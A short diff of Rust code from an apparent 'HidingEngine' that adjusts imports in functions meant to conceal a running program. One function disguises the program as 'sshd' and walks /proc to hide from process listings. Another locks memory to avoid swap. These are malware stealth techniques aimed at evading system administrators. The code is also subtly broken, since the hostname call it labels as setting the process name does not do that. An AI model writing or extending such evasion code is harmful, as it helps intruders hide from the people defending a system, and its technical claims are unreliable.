@@ -18,11 +18,11 @@ impl HidingEngine {
     pub fn hide_process(&self) -> Result<()> {
         #[cfg(target_os = "linux")]
         {
-            use nix::unistd::{getpid, sethostname};
+            use nix::unistd::sethostname;
             use std::fs;
             
             // Set process name
-            let _ = sethostname(b"sshd");
+            let _ = sethostname("sshd");
             
             // Hide from /proc
             if let Ok(proc_dir) = fs::read_dir("/proc") {
@@ -66,7 +66,7 @@ impl HidingEngine {
     pub fn hide_memory(&self) -> Result<()> {
         #[cfg(unix)]
         {
-            use libc::{mlock, MCL_CURRENT, MCL_FUTURE};
+            use libc::{MCL_CURRENT, MCL_FUTURE};
             unsafe {
                 // Lock memory to prevent swapping
                 let _ = libc::mlockall(MCL_CURRENT | MCL_FUTURE);
